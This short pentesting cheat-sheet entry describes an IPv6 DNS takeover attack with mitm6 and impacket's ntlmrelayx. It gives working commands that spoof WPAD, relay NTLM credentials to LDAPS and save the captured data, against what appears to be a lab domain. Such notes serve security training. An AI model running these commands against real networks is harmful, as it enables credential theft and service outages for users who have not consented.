# IPV6 Attacks
### DNS Takeover
[mitm6](https://github.com/dirkjanm/mitm6) is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. As a DNS server, mitm6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server. Mitm6 is designed to work together with ntlmrelayx from impacket for WPAD spoofing and credential relaying. 

> This can and will cause outages. Run in short bursts.

```bash
ntlmrelayx.py -6 -t ldaps://10.13.37.10 -wh fakewpad.marvel.local -l loot

sudo mitm6 -d MARVEL.LOCAL
